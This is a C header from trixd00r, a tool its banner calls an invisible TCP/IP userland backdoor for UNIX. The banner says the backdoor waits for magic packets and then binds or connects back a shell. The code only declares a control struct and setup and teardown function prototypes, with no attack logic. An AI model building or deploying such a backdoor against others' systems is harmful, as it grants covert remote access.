/*******************************************************************************
 *                ____                     _ __                                *
 *     ___  __ __/ / /__ ___ ______ ______(_) /___ __                          *
 *    / _ \/ // / / (_-</ -_) __/ // / __/ / __/ // /                          *
 *   /_//_/\_,_/_/_/___/\__/\__/\_,_/_/ /_/\__/\_, /                           *
 *                                            /___/ nullsecurity team          *
 *                                                                             *
 * trixd00r - Advanced and invisible TCP/IP based userland backdoor            *
 *                                                                             *
 * FILE                                                                        *
 * client/inc/controller.h                                                     *
 *                                                                             *
 * DATE                                                                        *
 * 02/10/2012                                                                  *
 *                                                                             *
 * DESCRIPTION                                                                 *
 * trixd00r is an advanced and invisible userland backdoor based on TCP/IP for *
 * UNIX systems. It consists of a server and a client. The server sits and     *
 * waits for magic packets using a sniffer. If a magic packet arrives, it will *
 * bind a shell over TCP or UDP on the given port or connecting back to the    *
 * client again over TCP or UDP. The client is used to send magic packets to   *
 * trigger the server and get a shell.                                         *
 *                                                                             *
 * COPYRIGHT                                                                   *
 * Read docs/COPYING.                                                          *
 *                                                                             *
 * AUTHOR                                                                      *
 * noptrix - http://www.nullsecurity.net/                                      *
 *                                                                             *
 ******************************************************************************/


#ifndef __CONTROLLER_H__
#define __CONTROLLER_H__


#include "trixd00r.h"
#include "packet.h"
#include "shell.h"


#define QUIET   0   /* quiet mode */
#define VERBOSE 1   /* verbose mode */


typedef struct {
    packet_t *packet;       /* see packet.h */
    shell_t *shell;         /* see shell.h */
    unsigned char verbose;  /* verbosity */
} ctrl_t;


/* free used memory for trixd00r */
void free_trixd00r(ctrl_t *);


/* install signal handler */
void install_signals();


/* allocate buffer for each struct and fill in with zeros */
ctrl_t *alloc_structs();


/* set default values for ctrl_t */
ctrl_t *set_ctrl_defaults(ctrl_t *);


/* end of trixd00r */
void end_trixd00r(ctrl_t *);


/* begin of trixd00r */
void start_trixd00r(ctrl_t *);


#endif

/* EOF */
